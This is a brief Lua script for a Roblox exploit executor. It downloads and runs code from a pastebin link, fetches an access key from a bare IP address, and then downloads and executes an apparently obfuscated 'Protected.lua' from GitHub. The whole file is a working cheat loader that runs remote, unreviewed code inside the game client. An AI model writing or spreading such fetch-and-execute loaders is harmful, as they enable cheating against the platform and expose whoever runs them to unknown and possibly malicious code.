local MakeNotification = loadstring(game:HttpGet(('https://pastebin.com/raw/WeCsqQw2')))()
local Response = syn.request({
    Url = "http://147.189.128.198:5000/api/currentkey",
    Method = "GET"
})

local Key = "Key: " .. Response.Body

  MakeNotification:MakeNotification({
	Name = "This the Key:",
	Content = Key,
	Image = "",
	Time = 5
})
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/imandrewyo/ROSMM/main/Protected.lua", true))()